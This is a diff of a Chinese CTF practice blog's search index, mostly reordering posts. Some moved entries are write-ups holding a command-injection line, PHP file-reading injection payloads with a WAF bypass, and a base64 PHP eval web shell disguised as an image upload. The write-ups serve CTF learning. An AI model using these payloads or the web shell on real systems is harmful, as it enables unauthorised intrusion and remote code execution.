@@ -192,49 +192,6 @@ EXECUTE name;  //执行预定义SQL语句
       </tags>
   </entry>
   <entry>
-    <title>20210522</title>
-    <url>/posts/2876c380/</url>
-    <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
-</code></pre>
-<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><blockquote>
-<p>http协议</p>
-</blockquote>
-<p>改代理</p>
-<pre><code>Referer:https://www.Sycsecret.com
-</code></pre>
-<p>改浏览器</p>
-<pre><code>User-Agent:Syclover
-</code></pre>
-<p>简单XFF</p>
-<pre><code>X-Forwarded-For:127.0.0.1
-</code></pre>
-<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><blockquote>
-<p>sql注入</p>
-</blockquote>
-<p>扫根目录</p>
-<pre><code>? num=1;var_dump(scandir(chr(47)))
-</code></pre>
-<p>flag文件内容</p>
-<pre><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
-</code></pre>
-<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
-<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线</p>
-<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><blockquote>
-<p>文件上传</p>
-</blockquote>
-<p><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210524</title>
     <url>/posts/c11566b5/</url>
     <content><![CDATA[<h2 id="flag藏在变量里"><a href="#flag藏在变量里" class="headerlink" title="flag藏在变量里"></a>flag藏在变量里</h2><p>神奇的GLOBALS打印出全部变量<br>    /?args=GLOBALS</p>
@@ -290,6 +247,49 @@ id=0&#39; union select 1,2,3,列名 from 表名#
         <tag>web</tag>
         <tag>sql注入</tag>
         <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210522</title>
+    <url>/posts/2876c380/</url>
+    <content><![CDATA[<h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><pre><code>127.0.0.1 | find / -name flag #一种查找方法
+</code></pre>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><blockquote>
+<p>http协议</p>
+</blockquote>
+<p>改代理</p>
+<pre><code>Referer:https://www.Sycsecret.com
+</code></pre>
+<p>改浏览器</p>
+<pre><code>User-Agent:Syclover
+</code></pre>
+<p>简单XFF</p>
+<pre><code>X-Forwarded-For:127.0.0.1
+</code></pre>
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><blockquote>
+<p>sql注入</p>
+</blockquote>
+<p>扫根目录</p>
+<pre><code>? num=1;var_dump(scandir(chr(47)))
+</code></pre>
+<p>flag文件内容</p>
+<pre><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+</code></pre>
+<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线</p>
+<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><blockquote>
+<p>文件上传</p>
+</blockquote>
+<p><a href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">https://www.cnblogs.com/wangtanzhi/p/12243206.html</a></p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -372,17 +372,6 @@ findFile(path)
       </tags>
   </entry>
   <entry>
-    <title>20210601</title>
-    <url>/posts/810f4ee1/</url>
-    <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210615</title>
     <url>/posts/9f79bbb9/</url>
     <content><![CDATA[<h2 id="蓝帽杯-2021-One-Pointer"><a href="#蓝帽杯-2021-One-Pointer" class="headerlink" title="[蓝帽杯 2021]One Pointer"></a>[蓝帽杯 2021]One Pointer</h2><p>首先下载源码，包含user.php和add_api.php代码审计</p>
@@ -404,6 +393,17 @@ findFile(path)
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210601</title>
+    <url>/posts/810f4ee1/</url>
+    <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -481,6 +481,27 @@ findFile(path)
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210819</title>
+    <url>/posts/9c51da98/</url>
+    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
+<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
+</code></pre>
+<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
+<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
+<pre><code> echo urlencode(serialize($KEY));
+</code></pre>
+<p>先urlencode一下不容易出错</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -576,27 +597,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210819</title>
-    <url>/posts/9c51da98/</url>
-    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
-<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
-</code></pre>
-<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
-<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
-<pre><code> echo urlencode(serialize($KEY));
-</code></pre>
-<p>先urlencode一下不容易出错</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>对web漏洞常见缩写的解释</title>
     <url>/posts/e15b0610/</url>
     <content><![CDATA[<h1 id="对web漏洞常见缩写的解释"><a href="#对web漏洞常见缩写的解释" class="headerlink" title="对web漏洞常见缩写的解释"></a>对web漏洞常见缩写的解释</h1><h2 id="xss（跨站脚本攻击）"><a href="#xss（跨站脚本攻击）" class="headerlink" title="xss（跨站脚本攻击）"></a>xss（跨站脚本攻击）</h2><p>全称<strong>Cross Site Scripting</strong>，攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
@@ -683,20 +683,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210827</title>
-    <url>/posts/50c4a45c/</url>
-    <content><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210830</title>
     <url>/posts/d7bb00be/</url>
     <content><![CDATA[<h1 id="HMBCTF-2021-EzLight"><a href="#HMBCTF-2021-EzLight" class="headerlink" title="[HMBCTF 2021]EzLight"></a>[HMBCTF 2021]EzLight</h1><p>先下载源码，本地搭建一下环境，我这出了点问题了，一直显示服务器内部错误。</p>
@@ -733,6 +719,20 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210827</title>
+    <url>/posts/50c4a45c/</url>
+    <content><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -815,8 +815,8 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>sql注入</tag>
-        <tag>文件上传</tag>
         <tag>代码审计</tag>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -914,6 +914,42 @@ Submit
       </tags>
   </entry>
   <entry>
+    <title>20211015</title>
+    <url>/posts/2348a06e/</url>
+    <content><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote>
+<p>模板注入</p>
+</blockquote>
+<p>先看提示，发现hints和/fllllllllllllag，根据url猜测是任意文件读取，研究后面参数，看hints，发现render，研究研究啥玩意</p>
+<p>render是一个类似模板的东西，可以使用不同的参数来访问网页</p>
+<p>在tornado模板中，存在一些可以访问的快速对象，例如 <code>&#123;&#123;handler.settings&#125;&#125;</code></p>
+<p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p>
+<p>而RequestHandler.settings又指向self.application.settings</p>
+<p>所有handler.settings就指向RequestHandler.application.settings</p>
+<p>可以获得一些设置</p>
+<p>然后成功获得cookie_secret，md5获得hash值即可</p>
+<p>在msg页面可以实现模板注入</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20211018</title>
+    <url>/posts/5df9dcd3/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20210928</title>
     <url>/posts/c1b9d3fa/</url>
     <content><![CDATA[<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><blockquote>
@@ -958,30 +994,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20211015</title>
-    <url>/posts/2348a06e/</url>
-    <content><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote>
-<p>模板注入</p>
-</blockquote>
-<p>先看提示，发现hints和/fllllllllllllag，根据url猜测是任意文件读取，研究后面参数，看hints，发现render，研究研究啥玩意</p>
-<p>render是一个类似模板的东西，可以使用不同的参数来访问网页</p>
-<p>在tornado模板中，存在一些可以访问的快速对象，例如 <code>&#123;&#123;handler.settings&#125;&#125;</code></p>
-<p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p>
-<p>而RequestHandler.settings又指向self.application.settings</p>
-<p>所有handler.settings就指向RequestHandler.application.settings</p>
-<p>可以获得一些设置</p>
-<p>然后成功获得cookie_secret，md5获得hash值即可</p>
-<p>在msg页面可以实现模板注入</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20211017</title>
     <url>/posts/cd46c142/</url>
     <content><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>buu这个题应该是环境有问题，不能复现wp</p>
@@ -1001,18 +1013,6 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20211018</title>
-    <url>/posts/5df9dcd3/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1194,13 +1194,6 @@ is=flag&amp;flag=flag
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>58.245.43.163</title>
-    <url>/posts/b47b00b2/</url>
-    <content><![CDATA[<h1 id="这几把谁啊，真是闲的蛋疼"><a href="#这几把谁啊，真是闲的蛋疼" class="headerlink" title="这几把谁啊，真是闲的蛋疼"></a>这几把谁啊，真是闲的蛋疼</h1><p>一共访问了1700多次，合着跑字典呢</p>
-<p><img src="https://raw.githubusercontent.com/Haorical/images/master/2021/20210818114140.png?token=AQ4CEDHEUHVKVWVNHKIAYQDBDSA3A" alt="git"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>CUMTCTF春季赛部分writeup</title>
     <url>/posts/17e673fc/</url>
     <content><![CDATA[<blockquote>
@@ -1298,6 +1291,13 @@ while os.path.exists(p1) or os.path.exists(p2):
       <tags>
         <tag>ctf</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>58.245.43.163</title>
+    <url>/posts/b47b00b2/</url>
+    <content><![CDATA[<h1 id="这几把谁啊，真是闲的蛋疼"><a href="#这几把谁啊，真是闲的蛋疼" class="headerlink" title="这几把谁啊，真是闲的蛋疼"></a>这几把谁啊，真是闲的蛋疼</h1><p>一共访问了1700多次，合着跑字典呢</p>
+<p><img src="https://raw.githubusercontent.com/Haorical/images/master/2021/20210818114140.png?token=AQ4CEDHEUHVKVWVNHKIAYQDBDSA3A" alt="git"></p>
+]]></content>
   </entry>
   <entry>
     <title>CUMT初夏赛部分wp</title>
@@ -1486,6 +1486,18 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
+    <title>jwt总结</title>
+    <url>/posts/e8e4811b/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>git更新</title>
     <url>/posts/bc46b23a/</url>
     <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote>
@@ -1498,18 +1510,6 @@ print(&#39;&#39;.join(flag))
       </categories>
       <tags>
         <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jwt总结</title>
-    <url>/posts/e8e4811b/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1807,6 +1807,12 @@ str + &#39; &#39; # 连接字符串
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> statistics (</span><br><span class="line">    id <span class="type">BIGINT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    class_id <span class="type">BIGINT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    average <span class="keyword">DOUBLE</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> statistics (class_id, average) <span class="keyword">SELECT</span> class_id, <span class="built_in">AVG</span>(score) <span class="keyword">FROM</span> students <span class="keyword">GROUP</span> <span class="keyword">BY</span> class_id;</span><br></pre></td></tr></table></figure>
 
 <h3 id="强制使用指定索引"><a href="#强制使用指定索引" class="headerlink" title="强制使用指定索引"></a>强制使用指定索引</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students FORCE INDEX (idx_class_id) <span class="keyword">WHERE</span> class_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>开发工具</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+      </tags>
   </entry>
   <entry>
     <title>vm+kali+docker实现web题复现</title>
@@ -1877,43 +1883,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
-    <title>中国矿业大学正方教务爬虫</title>
-    <url>/posts/6f73e94e/</url>
-    <content><![CDATA[<h1 id="中国矿业大学正方教务爬虫"><a href="#中国矿业大学正方教务爬虫" class="headerlink" title="中国矿业大学正方教务爬虫"></a>中国矿业大学正方教务爬虫</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>项目地址：</strong></p>
-<p><a href="https://github.com/Haorical/CUMT-jwxt">https://github.com/Haorical/CUMT-jwxt</a></p>
-<p>配置好后直接运行main.py就可以体验爬取成绩的功能，代码可读性良好，适合二次开发。</p>
-<p>本着服务抗大学子的宗旨，写了这个教务爬虫，用来练手，应该会开发一段时间，目前只<br>实现了模拟登录和爬取成绩，万众瞩目的自动抢课功能由于当前没有开放选课，暂时无法<br>开发，暂时搁置。</p>
-<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>一共写了两个版本，一个是使用selenium的SlowLogin，看名字就看出来了，这个登录的慢<br>而且需要配置webdriver，登录一次大约需要8-10秒钟；另一个是基于requests的<br>FastLogin，这个顾名思义就相当的快了，登录一次不到五秒钟，速度飞起，而且可能我用的<br>vpn比较卡，在校园网上应该能更快。</p>
-<p>两个版本可以自由切换,在config中设置即可，更改login即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - login: <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>两个模拟登录都可以直接返回成功登录之后的cookie，可以用来爬之后的界面，非常适合二次开发，欢迎二次开发，最好给个star :)</p>
-<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>先说SlowLogin，比较无脑，获得输入框的xpath，然后直接sendkeys，这里有个比较麻烦<br>的就是验证码的问题，这里我用了webdriver的screenshot方法，将图片保存到本地，然后调用<br>百度的ocr，要花钱(5555)，而且存在识别错现象。因为本来就不是很智能，用人眼看填验证码的话<br>就更不智能了。</p>
-<p>FastLogin这个就非常智能，模拟了发包过程，通过分析登录操作可以知道，先get RSA的公钥再get验证码，分析前端加密js可知，是通过rsa对password进行了加密，我们可以用简单的用python模拟，考虑到搭建环境太复杂，这里是模拟的，没有用exejs和node.js，因此耗费了很长时间，其中jsFunction模拟了js中对RSA的加密。由于get的验证码是二进制文件<br>我们可以直接将其写入文件中，然后调用baiduocr的api识别，或者人工识别，两个函数在FastLogin中可以自由选择，可以通过config.yml进行设置</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 智能人工识别验证码</span></span><br><span class="line">code = get_code_by_people(sessions)</span><br><span class="line"><span class="comment"># 人工智能识别验证码</span></span><br><span class="line">code = get_code_by_ocr(sessions)</span><br></pre></td></tr></table></figure>
-<p>config如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - AI: true</span><br></pre></td></tr></table></figure>
-<p>调用人工识别函数的时候比较有趣，如下，会弹出窗口，然后人工识别</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224421.png"></p>
-<p>可以看到成功获得了cookie</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224809.png"></p>
-<p>ocr识别的话，如下</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916225044.png"></p>
-<p>可以看到，只识别了一次，如果识别错误的话，会自动重新登录，直到登录成功</p>
-<h3 id="爬取成绩"><a href="#爬取成绩" class="headerlink" title="爬取成绩"></a>爬取成绩</h3><p>分析抓包即可，页面逻辑比较简单，post后返回的是json数据，解析，保存成了字典，{科目=&gt;[平时分，期末分，总分，学分，绩点]}，因为获得平时分时需要每一科都请求一次，因此速度比较慢，其中也有一些选项，自己探索吧，懒得写了，睡觉！</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916230422.png"></p>
-<p>一些设置如下，需要保存在config.yml中</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">&#x27;xxxxxxxx&#x27;</span> <span class="string">学号</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">password:</span> <span class="string">&#x27;xxxxxxxxxx&#x27;</span> <span class="string">密码</span></span><br><span class="line"><span class="attr">ocr:</span> <span class="string">百度识图的api</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&#x27;xxxxxxxxxxx&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">secret:</span> <span class="string">&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="attr">opinions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">AI:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">login:</span> <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>python实践</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>中国矿业大学今日校园自动打卡python实现</title>
     <url>/posts/f7c1df40/</url>
     <content><![CDATA[<blockquote>
@@ -1954,7 +1923,7 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
 <h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
 <p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
 <blockquote>
-<p>邮箱： <a href="mailto:&#x69;&#107;&#x61;&#101;&#107;&#107;&#x6b;&#x40;&#x64;&#105;&#110;&#103;&#x74;&#x61;&#x6c;&#107;&#46;&#x63;&#111;&#x6d;">&#x69;&#107;&#x61;&#101;&#107;&#107;&#x6b;&#x40;&#x64;&#105;&#110;&#103;&#x74;&#x61;&#x6c;&#107;&#46;&#x63;&#111;&#x6d;</a></p>
+<p>邮箱： <a href="mailto:&#105;&#x6b;&#x61;&#101;&#107;&#x6b;&#107;&#64;&#100;&#x69;&#110;&#x67;&#116;&#x61;&#108;&#x6b;&#x2e;&#x63;&#x6f;&#x6d;">&#105;&#x6b;&#x61;&#101;&#107;&#x6b;&#107;&#64;&#100;&#x69;&#110;&#x67;&#116;&#x61;&#108;&#x6b;&#x2e;&#x63;&#x6f;&#x6d;</a></p>
 </blockquote>
 ]]></content>
       <categories>
@@ -1962,6 +1931,43 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </categories>
       <tags>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>中国矿业大学正方教务爬虫</title>
+    <url>/posts/6f73e94e/</url>
+    <content><![CDATA[<h1 id="中国矿业大学正方教务爬虫"><a href="#中国矿业大学正方教务爬虫" class="headerlink" title="中国矿业大学正方教务爬虫"></a>中国矿业大学正方教务爬虫</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>项目地址：</strong></p>
+<p><a href="https://github.com/Haorical/CUMT-jwxt">https://github.com/Haorical/CUMT-jwxt</a></p>
+<p>配置好后直接运行main.py就可以体验爬取成绩的功能，代码可读性良好，适合二次开发。</p>
+<p>本着服务抗大学子的宗旨，写了这个教务爬虫，用来练手，应该会开发一段时间，目前只<br>实现了模拟登录和爬取成绩，万众瞩目的自动抢课功能由于当前没有开放选课，暂时无法<br>开发，暂时搁置。</p>
